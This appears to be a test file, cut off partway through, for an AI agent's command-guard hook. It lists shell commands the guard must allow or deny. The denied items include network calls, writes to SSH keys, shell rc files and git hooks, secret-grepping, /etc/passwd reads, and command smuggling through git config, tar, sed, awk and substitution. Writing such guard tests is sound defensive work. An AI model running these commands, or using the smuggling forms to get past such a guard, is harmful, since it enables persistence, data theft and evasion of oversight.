// Tests for the zero-trust-review plugin hooks and manifests. Run: node --test hooks/zt-hooks.test.mjs
// Both hooks are driven as child processes with stdin fixtures, a private TMPDIR and a private ZT_MARKER_DIR (0700) holding the .active marker,
// so a real marker on this host can never make these tests act on a live run. Marker trust checks live in skills/zero-trust-review/runctx.mjs.
import { after, test } from 'node:test';
import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import { chmodSync, existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, statSync, symlinkSync, utimesSync, writeFileSync } from 'node:fs';
import { homedir, tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';

const HERE = dirname(fileURLToPath(import.meta.url));
const ROOT = dirname(HERE);
const GUARD = join(HERE, 'zt-guard.mjs');
const CAPTURE = join(HERE, 'zt-capture.mjs');

const made = [];
after(() => made.forEach(d => rmSync(d, { recursive: true, force: true })));
// unresolved on purpose: tmpdir() is /var/... on macOS, a symlink into /private, which the guard must resolve itself
// sk = a skill dir outside the plugin (sandbox-run.mjs + note.mjs) that RUN/.skilldir names, as `note.mjs activate` would; home = marker dir under $HOME
function fixture({ marker = true, ageH = 0, markerText, markerMode = 0o600, dirMode = 0o700, skilldir = true, home = false } = {}) {
  const tmp = mkdtempSync(join(tmpdir(), 'zt-hooks-'));
  made.push(tmp);
  const md = home ? join(tmp, '.cache', 'zt-review') : join(tmp, 'marker'), run = join(tmp, 'run-1'), sk = join(tmp, 'sk');
  mkdirSync(md, { recursive: true });
  for (const d of [md, run, sk]) { mkdirSync(d, { recursive: true }); chmodSync(d, 0o700); }
  for (const f of ['sandbox-run.mjs', 'note.mjs']) writeFileSync(join(sk, f), '// stand-in\n');
  if (skilldir) writeFileSync(join(run, '.skilldir'), `${sk}\n`, { mode: 0o600 });
  if (marker) {
    const m = join(md, '.active');
    writeFileSync(m, markerText ?? `${run}\nsecond line\n`);
    chmodSync(m, markerMode);
    if (ageH) utimesSync(m, new Date(Date.now() - ageH * 3600e3), new Date(Date.now() - ageH * 3600e3));
  }
  chmodSync(md, dirMode);
  return { tmp, md, run, sk, home: home ? tmp : undefined };
}
const drive = (script, fx, input, raw) => spawnSync(process.execPath, [script], {
  input: raw ?? JSON.stringify(input), env: { ...process.env, TMPDIR: fx.tmp, ZT_MARKER_DIR: fx.md, ...(fx.home && { HOME: fx.home }) }, encoding: 'utf8',
});

// ---------- guard ----------
const FX = fixture();
symlinkSync('/etc', join(FX.tmp, 'link-to-etc'));
symlinkSync(FX.run, join(FX.tmp, 'lnk-run'));
symlinkSync(FX.tmp, join(FX.tmp, 'lnk-self')); // a link back to the temp dir itself
mkdirSync(join(FX.tmp, 'exists')); // a directory that exists, for `cd` followed by `;`
const T = FX.tmp, R = FX.run, MD = FX.md, SK = FX.sk;
const SKILL_DIR = join(ROOT, 'skills', 'zero-trust-review'), SANDBOX = join(SKILL_DIR, 'sandbox-run.mjs'), NOTE = join(SKILL_DIR, 'note.mjs');
const guardIn = (command, extra = {}) => ({ hook_event_name: 'PreToolUse', tool_name: 'Bash', agent_id: 'agent-1', cwd: '/work/repo', tool_input: { command }, ...extra });
const bash = (command, fx = FX, extra = {}) => drive(GUARD, fx, guardIn(command, extra));
const verdict = r => {
  assert.equal(r.status, 0, r.stderr);
  if (!r.stdout) return 'allow';
  const o = JSON.parse(r.stdout).hookSpecificOutput;
  assert.equal(o.hookEventName, 'PreToolUse');
  return o.permissionDecision;
};
const show = c => c.replace(/\n/g, ' \\n ').slice(0, 90);

const ALLOW = [
  // sandbox runner and notes: nothing after the script is examined, it is the runner's argv
  `node ${SANDBOX} --cwd /r --rw ${T} -- python3 -c 'import pytest'`,
  `node ${SANDBOX} --cwd /r --rw ${T}/w --ro /venv -- /venv/bin/pytest -q`,
  `node ${SK}/sandbox-run.mjs --cwd /r --rw ${T}/w -- ls`, // named by RUN/.skilldir
  `node ${SK}/note.mjs begin --unit u --ck ${R}/ck/u.jsonl --driver`, `node ${SK}/note.mjs begin --unit u --ck p`, `node ${SK}/note.mjs ck --ck ${R}/ck/u.jsonl '{"a":1}'`,
  `node ${SK}/note.mjs env --unit u 'text'`, `node ${SK}/note.mjs notes --unit u 'x'`, `node ${SK}/note.mjs done --unit u`, `node ${SK}/note.mjs dying --unit u '# md'`,
  `node ${SK}/note.mjs dying --unit u <<'EOF'\n{"claim":"x"}\nEOF`,
  `node ${NOTE} begin --unit u --ck p --driver`, `node ${SANDBOX} --check`, `node ${SANDBOX} --cwd=/r --rw=${T} -- ls`,
  `node ${SANDBOX} --cwd /r --rw ${T} --ro /v --timeout 60 --env A=1 --run ${R} --allow-port 5432 -- ls`, `node ${SANDBOX} -- ls`,
  `FOO=1 node ${SANDBOX} --cwd /r -- ls`,
  // git read-only
  `git log --oneline -5`,
  `cd /work/repo && git diff main...HEAD -- src/a.py | head -50`,
  `git -C /work/repo show HEAD:src/a.py`,
  `git archive HEAD | tar -x -C ${T}/src`,
  `/usr/bin/git status --short`,
  `git fetch origin refs/merge-requests/7/head`,
  `git -c color.ui=false log -1`, `git show HEAD~1:src/a.py`, `git show REV:path`, `git diff A...B -- f`, `git log -p --no-ext-diff --no-textconv -1`, `git log --output-indicator-new=+ -1`,
  `git archive HEAD`, `git diff -- --output`,
  // read-only / file tools
  `grep -rn "foo" src/ | wc -l`,
  `rg -n foo src`,
  `ls -la /work/repo`,
  `cat a.txt && head -5 b && tail -5 c`,
  `sort -u a | cut -d: -f1 | tr a-z A-Z`,
  `diff a b; stat a`,
  `basename /a/b && dirname /a/b && realpath . && readlink -f x && pwd`,
  `echo hi && printf '%s\\n' x && true && test -f a && [ -d b ]`,
  `date +%s; sleep 1`,
  `jq .a file.json`,
  `find . -name '*.py' -type f`,
  `awk '{print $1}' f`,
  `sed -n '1,5p' file`, `sed -n '10,20p' f`, `sed -n '/a/,/b/p' f`, `sed '1d;$d' f`, `sed 's/[0-9]\\+/N/g' f`, `sed 's|a|b|g;s#c#d#' f`, `sed -E 's/(a|b)/\\1/' f`,
  `sed -n '$p' f`, `sed 'y/abc/xyz/' f`, `sed -ne '3p' f`, `sed --expression='2p' f`, `sed -n -e '1p' -e '2p' f`, `sed '2,+3d' f`, `sed -n '1~2p' f`,
  `sed -n '/x/I p' f`, `sed -n '/a/!p' f`, `sed 's/a/b/2' f`, `sed 's/a/b/gI' f`, `sed -n '5q;p' f`, `sed 's/[/]/x/' f`, `sed 's/a/b/' ${R}/exec.jsonl`,
  `sed -i -e 's/a/b/' ${T}/f`, `sed -n 's/a/b/p' f | head`, `sed -n 1p f`,
  `awk '/a|b/ {print $1}' f`, `awk -F: '$3 > 5 {print $1}' f`, `awk '{ if ($1 ~ "a|b") print }' f`, `awk '{print $1 / 2}' f`, `awk -v x=1 'BEGIN{print x}'`, `awk 'NR==1' f`,
  `awk '{print}' ${R}/exec.jsonl`, `awk '{ print $1 ">" $2 }' f`,
  `tar -x -C ${T}/x -f a.tar`, `tar xf a.tar -C ${T}/x`, `tar -xzf a.tgz --strip-components=1 -C ${T}/x`, `tar -tf a.tar`, `tar --list --file=a.tar`, `tar --extract --directory=${T}/x -f a.tar`,
  `cd ${T}/x && tar xf a.tar`, `tar -xf a.tar -C ${T}/x --exclude='*.o'`,
  `sort -u f`, `sort -k2 -n f`, `sort -o ${T}/out f`, `sort --output=${T}/o f`, `sort --output ${T}/o f`, `sort -uo ${T}/o f`, `sort -ro${T}/o f`,
  `awk '{ if ($1 > 2) print $1 }' f`, `awk '{print ($1 > 2)}' f`, `awk '$1 >= 2 && $2 > 3' f`,
  `git symbolic-ref --short refs/remotes/origin/HEAD | sed 's|^origin/||'`, `git symbolic-ref HEAD`, `git --version`, `git version`, `git rev-parse HEAD`, `git ls-files`,
  `git merge-base A B`, `git blame f`, `git cat-file -p HEAD`, `git for-each-ref`, `git grep foo`, `git tag -l`, `git describe`, `git log --oneline | head`, `git ls-tree HEAD`,
  `sed -i 's/a/b/' ${T}/f`,
  `sed -i '' 's/a/b/' ${T}/f`,
  `tar -tzf a.tgz`,
  `tar xzf a.tgz -C ${T}/x`,
  `echo x | tee ${T}/out`,
  // fs writes under temp / RUN
  `mkdir -p ${T}/d`,
  `cp /work/repo/a.py ${T}/a.py`,
  `mv ${T}/a ${T}/b`,
  `rm -rf ${T}/x`,
  `rm -f ${T}/f`,
  `rm -rf "${T}/a b"`,
  `rm -rf ${T}/x/*`,
  `cd ${T} && rm -rf sub`,
  // docker
  `docker ps`, `docker port zt-x`, `docker logs zt-x`, `docker inspect zt-x`, `docker rm -f zt-x`, `docker rm --force zt-a zt-b`,
  `docker image ls`, `docker image inspect img`, `docker pull postgres:15`,
  `docker run -d --name zt-pg --network none -e POSTGRES_PASSWORD=x postgres:15`,
  // wrappers around allowed programs, quoting and shell syntax that is not a command
  `env FOO=1 git log`, `command git log`, `time ls`, `FOO=bar`, `command -v node`,
  `echo "a;b && python3 -c x"`, `grep 'python3 -c' file`, `ls # python3 in a comment`,
  `echo $(date)`, 'echo `date`', `echo "$(date) $((1+2))"`,
  `ls 2>&1 | head`, `ls > /dev/null 2>&1`, `ls &>/dev/null`,
  `cat <<EOF > ${T}/note\nimport os\npython3 x\nEOF`,
  `if [ -f a ]; then echo yes; fi`, `for f in a b; do echo $f; done`,
  `(cd /work/repo && git log -1)`,
  // redirects to /dev/*, the temp dir and fd duplication; builtins that assign only unrelated variables
  `echo x > /dev/null`, `echo x >/dev/stdout`, `echo x > /dev/stderr`, `echo x > /dev/tty`, `echo x > $TMPDIR/x`, `echo x > ${T}/x`, `echo x >> ${T}/d/log`, `echo x 2>&1`, `echo x >&2`,
  `ls 2>/dev/null`, `ls 2> ${T}/err.txt`, `ls &> ${T}/both`, `{ echo x; } > ${T}/g`, `(echo x) > ${T}/g`,
  `export FOO=1`, `declare -a arr`, `declare -x FOO=1`, `typeset FOO=1`, `readonly FOO=1`, `unset FOO`, `unset -v FOO BAR`, `export FOO=1 BAR=2`, `declare -p FOO`, `local x=1`,
  `read -r line`, `read -r a b`, `read`, `mapfile -t lines`, `readarray -t x`, `getopts ab opt`, `printf '%s\\n' x`, `printf %d 5`,
  `git remote -v`, `git remote show origin`, `git remote get-url origin`, `git branch -a`, `git branch --list`, `git branch -vv`,
  // wrappers with options we know
  `timeout 5 git log`, `nice -n 5 git log`, `nice -5 git log`, `env -i git log`, `env -u FOO git log`, `env --unset=FOO git log`, `env - git log`, `timeout -k 2 5 git log`,
  `timeout --preserve-status 5 ls`, `timeout 5s grep a b`, `timeout -s KILL 5 ls`,
  `stdbuf -oL git log`, `stdbuf -o L git log`, `nohup ls`, `time -p ls`, `command -p git log`, `ionice -c 3 git log`, `setsid -w ls`, `exec ls`,
  `/usr/bin/env FOO=1 git log`, `env FOO=1 BAR=2 grep a b`, `nice -n 5 timeout 5 git log`, `export -n FOO`, `export FOO`, `set -e`, `set -x`, `set -u`, `set -- a b`,
  // arithmetic and parameter expansion that stay plain
  `echo $((1+2))`, `echo $(( (1+2) * 3 ))`, `echo "$((1+2))"`, `echo $((1<<3)) && ls`, `echo $[1+2]`,
  `echo \${X:-default}`, `echo "\${X:-$(date)}"`, `echo \${X:-$((1+2))}`, `echo '$(( $(python3 x) ))' '\${X:-$(python3 x)}'`, `cat <<EOF\n$((1+2)) $(date)\nEOF`,
  // the ledgers can be READ, and other files in the run folder written; only exec.jsonl / obs.jsonl / the marker dir are off limits
  `cat ${R}/exec.jsonl`, `grep -c x ${R}/obs.jsonl | wc -l`, `tail -5 ${R}/exec.jsonl`, `wc -l ${R}/obs.jsonl`, `jq -c . ${R}/obs.jsonl`, `sort ${R}/obs.jsonl`,
  `sed -n 1p ${R}/exec.jsonl`, `ls ${R} ${MD}`, `cp ${R}/exec.jsonl ${T}/copy`, `cp ${R}/.skilldir ${T}/copy`, `echo x >> ${T}/scratch.log`, `cat ${R}/.skilldir`, `tail -5 ${R}/exec.jsonl`, `grep x < ${R}/obs.jsonl`,
];
for (const c of ALLOW) test(`guard allows: ${show(c)}`, () => assert.equal(verdict(bash(c)), 'allow'));

const DENY = [
  // interpreters and runners
  `python3 -c 'import pytest'`, `python -c 'import pytest'`, `python3.11 x.py`, `pip install x`, `pip3 install x`,
  `node x.js`, `node -e 'x'`, `node`, `node --check x.mjs`, `deno run x.ts`, `bun x.ts`, `npm test`, `npx jest`, `yarn test`, `pnpm test`,
  `ruby x.rb`, `perl -e x`, `php x.php`, `go test ./...`, `cargo test`, `rustc x.rs`, `mvn test`, `gradle test`, `make test`, `cmake .`,
  `java -jar x.jar`, `dotnet test`, `pytest -q`, `tox`, `nox`, `uv run x`, `poetry run x`,
  // shells and eval
  `bash script.sh`, `sh -c 'ls'`, `zsh x.sh`, `dash x.sh`, `ksh x.sh`, `bash -c "python3 x"`, `eval "ls"`, `source env.sh`, `. ./env.sh`, `echo x | bash`,
  // paths to local executables
  `./run.sh`, `/work/repo/bin/tool`, `.venv/bin/python x`, `~/bin/x`, `/usr/bin/python3 x`,
  // network
  `curl http://x`, `wget http://x`, `nc host 80`, `ncat host 80`, `ssh host`, `scp a host:b`, `sftp host`, `ftp host`, `telnet host`, `rsync -a a host:b`,
  // unknown programs, variable-indirect programs
  `frobnicate --x`, `$PY -c x`, `"$(which python3)" x`,
  // wrappers and nesting
  `env X=1 python3 x`, `command python3 x`, `xargs python3 x`, `timeout 10 python3 x`, `nice -n 5 python3 x`, `sudo python3 x`, `nohup python3 x &`,
  `time python3 x`, `exec python3 x`, `FOO=1 BAR=2 python3 x`,
  `echo $(python3 -c 'x')`, 'echo `python3 -c x`', `echo "$(python3 -c x)"`, `ls && python3 x`, `ls; python3 x`, `ls | python3`, `(python3 x)`,
  `ls\npython3 x`, `if python3 x; then echo; fi`, `cat <<EOF\n$(python3 -c x)\nEOF`, `python3 - <<EOF\nprint(1)\nEOF`, `python3 - <<'EOF'\nimport os\nEOF`,
  // git
  `git -c core.fsmonitor=./x status`, `git -c core.hooksPath=/x log`, `git -c core.sshCommand=x fetch`, `git -c alias.x='!sh' x`,
  `git config --get x`, `git alias`, `git credential fill`,
  ...['checkout main', 'reset --hard', 'stash', 'clean -fd', 'rm x', 'commit -m x', 'push', 'add .', 'apply p', 'am p', 'merge x', 'rebase x',
    'cherry-pick x', 'restore x', 'switch x', 'worktree add d', 'submodule update'].map(s => `git ${s}`),
  // rm / mv / cp / mkdir / tee outside temp and RUN
  `rm -rf src`, `rm /etc/x`, `rm -rf ${T}/../etc`, `rm -rf ${T}`, `rm ${T}/a /etc/b`, `rm -rf $HOME/x`, `rm -rf ${T}/x/../../y`, `rm -rf ${T}/link-to-etc/x`,
  `rm -rf ${T}/x/*/..`, `cd /work/repo && rm -rf sub`, `cd "$X" && rm foo`, `find . | xargs rm`,
  `mv src/a.py src/b.py`, `mv ${T}/a src/b`, `cp a.py src/b.py`, `mkdir src/new`, `tee src/x`,
  // tar create, tar exec options
  `tar czf x.tgz src`, `tar -cf x.tar a`, `tar xf a --to-command=sh`,
  // sed -i, awk exec, find exec
  `sed -i 's/a/b/' src/a.py`, `sed -i.bak 's/a/b/' src/a.py`, `sed --in-place 's/a/b/' src/a.py`, `sed -ni 's/a/b/p' src/a.py`,
  `awk 'BEGIN{system("x")}'`, `awk '{ "date" | getline x }'`, `awk '{print | "sh"}'`, `awk -f prog.awk f`,
  `find . -exec rm {} \\;`, `find . -delete`, `find . -execdir x {} +`, `find . -ok x \\;`,
  // redirects (and tee/cp/mv/sed -i) that would write outside the temp dir: git config, hooks, shell rc files, ssh, claude, the marker dir
  ...['~/.gitconfig', '~/.config/git/config', '~/.config/git/ignore', '.git/config', '.git/hooks/pre-commit', '/work/repo/.git/hooks/post-checkout', '~/.bashrc', '~/.zshrc', '~/.profile',
    '~/.ssh/authorized_keys', '~/.ssh/config', '~/.claude/settings.json', '~/.cache/zt-review/.active', '/etc/x', 'src/a.py', '$HOME/.gitconfig', '"$X"', '/tmp/not-our-tmp',
    `${T}/../escape`, `${T}/link-to-etc/passwd`, T].flatMap(p => [`echo x > ${p}`, `echo x >> ${p}`]),
  `echo x &> ~/.bashrc`, `echo x 2> ~/.gitconfig`, `echo x <> ~/.gitconfig`, `echo x >| ~/.gitconfig`, `echo x 1>> ~/.bashrc`, `cat <<EOF > ~/.gitconfig\n[core]\nEOF`,
  `cat > ~/.gitconfig <<EOF\nx\nEOF`, `{ echo x; } > ~/.bashrc`, `(echo x) > ~/.bashrc`, `exec > ~/.bashrc`, `ls > ~/.gitconfig && ls`, `echo x > "$HOME/.gitconfig"`,
  `tee ~/.gitconfig`, `cp a ~/.gitconfig`, `mv a ~/.bashrc`, `sed -i 's/a/b/' ~/.gitconfig`, `rm ~/.gitconfig`, `mkdir ~/.config/git`, `touch ~/.bashrc`,
  // git writers of config, and conflicting -c for the keys git must keep at its defaults
  `git remote add x y`, `git remote set-url origin u`, `git remote rename a b`, `git remote remove x`, `git remote rm x`, `git remote prune origin`, `git remote set-head origin -a`,
  `git branch -u origin/main`, `git branch --set-upstream-to=x`, `git branch --unset-upstream`, `git branch --edit-description`, `git lfs install`, `git sparse-checkout set x`,
  `git update-ref x y`, `git symbolic-ref HEAD x`, `git update-index --assume-unchanged x`, `git -c core.fsmonitor= status`, `git -c core.hooksPath=/dev/null status`,
  `git -c core.pager=cat log`, `git -c protocol.ext.allow=never fetch`, `git -c protocol.ext.allow=always fetch`,
  // builtins that assign a steering variable without a visible `=`, or that make assignments indirect
  `printf -v X hi`, `printf -vX hi`, `printf -v HOME %s x`, `printf -v PATH hi`, `printf -v -- X hi`,
  `export NODE_OPTIONS`, `export LD_PRELOAD`, `export FOO NODE_OPTIONS`, `export -n PATH`, `export -f PATH`, `declare -x LD_PRELOAD`, `declare LD_PRELOAD=x`, `typeset -x PATH`,
  `readonly PATH`, `readonly PATH=/x`, `local HOME=1`, `unset HOME`, `unset -v NODE_OPTIONS`, `declare 'HOME[0]=x'`, `export GIT_CONFIG_KEY_0=x`, `unset GIT_CONFIG_VALUE_3`,
  `declare -n x=HOME`, `declare -nx x`, `typeset -n r=PATH`, `local -n r=x`,
  `declare`, `declare -p`, `declare -x`, `typeset -x`, `readonly`, `readonly -p`, `local`,
  `set -a`, `set -ea`, `set -o allexport`, `set -o`, `set +o`, `set -euo pipefail`, `set -o pipefail`,
  `read -r PATH`, `read HOME`, `read -r a TMPDIR`, `read -p x NODE_OPTIONS`, `mapfile PATH`, `mapfile -t HOME`, `readarray -t NODE_OPTIONS`, `mapfile -C sh -c 1 x`, `readarray -C sh x`,
  `getopts ab PATH`, `getopts 'ab:' HOME -a`, `for PATH in a b; do echo; done`, `for HOME in a; do ls; done`, `select PATH in a; do ls; done`,
  `GIT_CONFIG_KEY_0=x git log`, `GIT_CONFIG_VALUE_12=x git log`, `env GIT_CONFIG_KEY_1=x git log`, `export GIT_CONFIG_COUNT=1`,
  // wrappers: unknown or command-carrying options, nothing left to run, privilege wrappers, the whole environment
  `env -S 'python3 -c x'`, `env -S"python3 -c x"`, `env --split-string='python3 -c x'`, `env --split-string 'python3 -c x'`, `env -C /tmp git log`, `env --chdir=/tmp git log`,
  `env -u HOME git log`, `env --unset=TMPDIR git log`, `env -uPATH git log`, `env -x git log`, `env --version`, `env -i -S 'python3 x'`,
  `nice -n 5 python3 x`, `nice -n x git log`, `nice --foo ls`, `nice -n 5`, `nice`, `timeout 5 python3 x`, `timeout abc git log`, `timeout git log`, `timeout -x 5 ls`, `timeout 5`, `timeout -s ';id' 5 ls`,
  `env`, `env FOO=1`, `env -i`, `/usr/bin/env`, `nohup`, `time`, `time -p`, `command`, `command -p`, `exec`, `exec -a x`, `printenv`, `printenv HOME`,
  `export -p`, `export`, `export -pf`, `set`, `declare -x`, `echo $(env)`, `env | grep TOKEN`, `FOO=1 env`, `nohup env`,
  // programs that take their arguments from stdin, a schedule or another session cannot be checked: all denied, whatever they run
  `grep -l x f | xargs git -c core.pager=sh log`, `echo a | xargs awk 'BEGIN{system("x")}'`, `xargs rg --pre x`, `xargs echo`, `xargs`, `xargs -n 1`, `xargs grep foo`, `xargs -0 -r grep foo`,
  `xargs -I{} grep foo {}`, `xargs -i wc -l {}`, `xargs -I{} {} x`, `xargs -i sh -c x`, `xargs --replace=X X`, `xargs -P 4 -n1 wc -l`, `find . -name x | xargs rm`, `printf x | xargs tar xf`,
  `time xargs ls`, `nice xargs ls`, `/usr/bin/xargs ls`, `parallel echo ::: a b`, `watch ls`, `entr ls`, `script -q /dev/null ls`, `at now`, `batch`, `crontab -l`, `crontab x`,
  `launchctl list`, `launchctl submit -l x ls`, `systemd-run ls`, `xdg-open x`, `open x`, `open -a Terminal`, `nohup sh -c x`, `nohup xargs ls`,
  `sudo ls`, `sudo -u root ls`, `doas ls`, `su -c ls`, `runas x`, `chroot / sh`, `caffeinate git log`, `ionice -c 3 python3 x`, `ionice -p 1 ls`, `ionice -c x ls`, `setsid python3 x`, `setsid -x ls`,
  `stdbuf -x ls`, `stdbuf -o Q ls`, `stdbuf -oL`, `exec -x ls`, `nohup -x ls`, `time -f x ls`, `command -x ls`,
  // sed: e/w/r commands, e/w flags, -f; only addresses + p d q s y
  `sed 's/a/b/e' f`, `sed 's/a/b/ge' f`, `sed 's/a/b/w out' f`, `sed 'e echo hi' f`, `sed '1e id' f`, `sed '1!e id' f`, `sed 'w out' f`, `sed 'W out' f`,
  `sed 'r /etc/passwd' f`, `sed 'R x' f`, `sed -f script.sed f`, `sed --file=x f`, `sed --file x f`, `sed -nf x f`, `sed -e p -e 'e id' f`, `sed --expression='e id' f`,
  `sed --expression 'w x' f`, `sed -ne 'e id' f`, `sed -ne'e id' f`, `sed -n '/x/w out' f`, `sed 's/a/b/;e id' f`, `sed 's/a/b/; w x' f`, `sed '{p}' f`, `sed '$!N;P;D' f`,
  `sed 'a text' f`, `sed 'i text' f`, `sed 'c x' f`, `sed '#n' f`, `sed -l 5 p f`, `sed --debug p f`, `sed 's/a/b/e' -i ${T}/f`, `sed -i 'w x' ${T}/f`, `sed -i -f x ${T}/f`,
  `sed 's/a/b' f`, `sed 'sXaXbX' f`, `sed`, `sed 's/\\(/b/e' f`, `sed 's/a/b/ ;e id' f`, `sed 's/a/b/\ne id' f`, `sed -s -n 'e' f`, `sed -n '/a/e' f`,
  // command substitution hiding in arithmetic, $[ ], parameter-expansion defaults, double quotes and here-docs; unbalanced bodies are denied
  `echo $(( $(python3 -c 'print(1)') + 1 ))`, `echo $(($(python3 -c x)))`, 'echo $(( `python3 -c x` ))', `echo $(( 1 + $((2 + $(python3 x))) ))`, `echo $(( <(python3 x) ))`,
  `echo "$(( $(python3 -c x) ))"`, `echo $[ $(python3 -c x) + 1 ]`, 'echo $[ `python3 x` ]', `echo \${X:-$(python3 -c x)}`, `echo "\${X:-$(python3 -c x)}"`, `echo \${X/$(python3 -c x)/y}`,
  'echo \${X:-`python3 x`}', `echo \${X:=$(curl http://x)}`, `echo \${X:-$(( $(python3 x) ))}`, `x=$(( $(python3 -c x) ))`, `export A=$(( $(curl x) ))`, `echo <(python3 x)`,
  `echo $(( 1 + (2 ))`, `echo $(( 1 + 2 )`, `echo $(( $(date) )`, `echo $(( 1 + 2 ))) $(python3 x)`, `cat <<EOF\n$(( $(python3 -c x) ))\nEOF`, `cat <<EOF\n\`python3 x\`\nEOF`, `cat <<EOF\n$(( 1 + 2 )\nEOF`,
  // git: config smuggled in, options that run programs / open pagers / write files, archive --remote, abbreviations
  `git --config-env=core.fsmonitor=EVIL status`, `git --config-env core.hooksPath=EVIL log`, `git --config-env=alias.x=EVIL x`, `git -c core.quotepath=false log`,
  `git -c diff.foo.command=x log`, `git -c diff.external=x diff`, `git -c pager.log=x log`, `git -c alias.x=y x`, `git -c credential.helper=x fetch`, `git -c filter.x.smudge=y log`,
  `git -c gpg.program=x log --show-signature`, `git -c protocol.ext.allow=always fetch`, `git -c core.pager=x log`, `git -c sequence.editor=x log`, `git -cinclude.path=x log`,
  `git log -O/x`, `git grep -O less foo`, `git grep --open-files-in-pager=less foo`, `git diff --output=/tmp/x`, `git diff --output x`, `git diff --ext-diff`,
  `git show --textconv HEAD:f`, `git --exec-path=/x status`, `git --exec-path status`, `git fetch --upload-pack=sh origin`, `git ls-remote --upload-pack=x origin`,
  `git fetch --receive-pack=x origin`, `git diff --no-index a b`, `git archive --remote=host HEAD`, `git archive --remote host HEAD`, `git diff --ext-d`, `git diff --textc`,
  `git ls-remote --exec=x origin`, `git diff --out=x`, `git help log`, `git hook run pre-commit`, `git gc`, `git maintenance run`,
  // tar: only list/extract; no program-running options; extraction only into the temp dir
  `tar xf a --to-command=sh`, `tar xf a --to-comm=sh`, `tar -xf a --checkpoint=1 --checkpoint-action=exec=sh`, `tar -xf a --use-compress-program=sh`, `tar -xf a --use-compress-prog=sh`,
  `tar -I sh -xf a`, `tar -xIf sh a`, `tar -xf a --rsh-command=x`, `tar -xf a --info-script=x`, `tar -xf a -F x`, `tar -xf a --new-volume-script=x`, `tar -xf a --remove-files`,
  `tar -c f`, `tar --create -f x.tar a`, `tar -r -f x.tar a`, `tar -u -f x.tar a`, `tar -A -f x.tar a`, `tar --append -f x.tar a`, `tar --delete -f x.tar a`, `tar -d -f x.tar`, `tar -M -xf a`,
  `tar xf a.tar`, `tar xf a.tar -C /work/repo`, `tar xf a.tar -C ${T}/../x`, `tar xf a.tar -C $X`, `tar -xf a --directory=/work/repo`, `tar -xf a.tar -C ${T}/x -C /work/repo`, `tar`, `tar -xtf a`,
  // sort / awk: programs run through allowed tools
  `sort --compress-program=sh f`, `sort --compress-prog sh f`, `sort --comp=sh f`,
  `awk '{print | cmd}' f`, `awk 'BEGIN { cmd="sh"; print "x" | cmd }'`, `awk '{ "date" | getline }' f`, `gawk 'BEGIN{system ("id")}'`, `awk '{print |& "sh"}'`, `awk --file=x f`,
  `awk -F: -f x f`, `awk -i inplace '{print}' f`, `gawk -l ordchr 'BEGIN{}'`, `awk 'BEGIN{ "id" | getline x }'`, `awk '{print >> "${R}/obs.jsonl"}' f`, `awk '{print > "${R}/notes.txt"}' f`,
  `awk '{print > "$RUN/exec.jsonl"}' f`, `mawk 'BEGIN{system("x")}'`, `nawk '{print | "sh"}'`,
  // editors, pagers, debuggers and launchers are not on the allow-list
  ...['less f', 'more f', 'man ls', 'vi f', 'vim f', 'nano f', 'emacs f', 'ed f', 'ex f', 'script -q /dev/null ls', 'expect -c x', 'strace ls', 'ltrace ls', 'gdb x',
    'lldb x', 'osascript -e x', 'open x'],
  // removed from the read-only allow-list (the hint names the allowed tools); sort/awk/find forms that write
  ...['uniq', 'uniq -c', 'xxd f', 'tree', 'od f', 'strings f', 'column -t f', 'file f', 'cmp a b', 'nl f', 'tac f', 'rev f', 'fold f', 'paste a b', 'comm a b', 'du -sh .', 'df -h',
    'md5sum f', 'md5 f', 'shasum f', 'sha256sum f', 'which git', 'type git', 'uname -a', 'whoami', 'id', 'hostname'],
  `sort a | uniq`, `sort a | uniq -c | head`, `cat f | xxd`,
  `sort -o src/out f`, `sort --output=src/out f`, `sort --output src/out f`, `sort -uo src/out f`, `sort -o ~/.gitconfig f`, `sort -o $X f`, `sort -o ${R}/notes f`, `sort -o ${T}/../x f`,
  `awk '{print > "x"}' f`, `awk '{print >> "x"}' f`, `awk '{printf "%s", $1 > "/dev/stderr"}' f`, `awk '{print $1 > $2 ".txt"}' f`, `awk 'BEGIN{print "x" > "/etc/y"}'`,
  `awk '{ print > "/dev/null" }' f`, `awk '@include "x"'`, `awk '@load "x"'`, `awk '{print $1 | "sort"}' f`, `awk '{print > $1}' f`,
  `find . -fprint out`, `find . -fprintf out x`, `find . -fls out`, `find . -fprint0 o`,
  `git st`, `git frobnicate`, `git clone x y`, `git init`, `git symbolic-ref HEAD refs/heads/x`, `git symbolic-ref -d HEAD`, `git symbolic-ref -m x HEAD y`, `git --help`, `git -h`,
  // rg --pre runs a command
  `rg --pre ./x foo`,
  // docker
  `docker run img`, `docker run --name foo img`, `docker run --name zt-a -v /:/x img`, `docker run --name zt-a -v/:/x img`, `docker run --name zt-a --volume /:/x img`,
  `docker run --name zt-a --mount type=bind,src=/,dst=/x img`, `docker run --name zt-a --privileged img`, `docker run --name zt-a --network host img`,
  `docker run --name zt-a --net=host img`, `docker run --name zt-a --pid host img`, `docker run --name zt-a --cap-add SYS_ADMIN img`,
  `docker exec zt-x sh`, `docker build .`, `docker rm -f other`, `docker rm zt-a other`, `docker cp zt-x:/a b`, `docker -H tcp://h ps`,
  // writing or appending into the ledgers or the marker dir, by any program (only note.mjs, sandbox-run.mjs and the hooks write there)
  `echo x >> ${R}/exec.jsonl`, `echo x > ${R}/obs.jsonl`, `echo x >| ${R}/exec.jsonl`, `echo x &> ${R}/obs.jsonl`, `printf x 1>> ${R}/exec.jsonl`, `: > ${R}/exec.jsonl`,
  `echo x | tee ${R}/exec.jsonl`, `echo x | tee -a ${R}/obs.jsonl`, `cp a ${R}/exec.jsonl`, `cp -t ${R} a && echo x >> ${R}/obs.jsonl`, `mv a ${R}/obs.jsonl`,
  `mv ${R}/exec.jsonl ${T}/gone`, `rm ${R}/exec.jsonl`, `rm -f ${R}/obs.jsonl`, `touch ${R}/obs.jsonl`, `sed -i 's/a/b/' ${R}/exec.jsonl`,
  `sort -o ${R}/obs.jsonl x`, `dd if=a of=${R}/exec.jsonl`, `echo x > ${MD}/.active`, `cp a ${MD}/.active`, `rm -rf ${MD}`, `mv ${MD} ${T}/m`,
  `echo x >> ${T}/lnk-run/exec.jsonl`, `echo x >> ${R}/../run-1/./exec.jsonl`, `echo x > ${R}/obs.j*`, `echo x > ${R}/*.jsonl`,
